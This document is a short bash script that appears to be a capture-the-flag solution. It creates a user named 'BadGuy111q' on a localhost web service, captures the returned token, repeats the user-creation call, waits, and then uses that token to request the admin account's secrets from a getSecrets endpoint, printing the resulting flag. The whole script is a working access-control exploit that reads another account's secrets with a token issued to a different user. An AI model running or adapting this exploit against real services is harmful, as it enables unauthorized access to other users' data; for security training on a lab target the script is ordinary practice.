#!/bin/bash
user=BadGuy111q
token=$(curl -s http://localhost:8080/createUser?name=$user)
echo $token
curl -s http://localhost:8080/createUser?name=$user
sleep 5
flag=$(curl -s http://localhost:8080/getSecrets?name=admin\&token=$token)
echo $flag

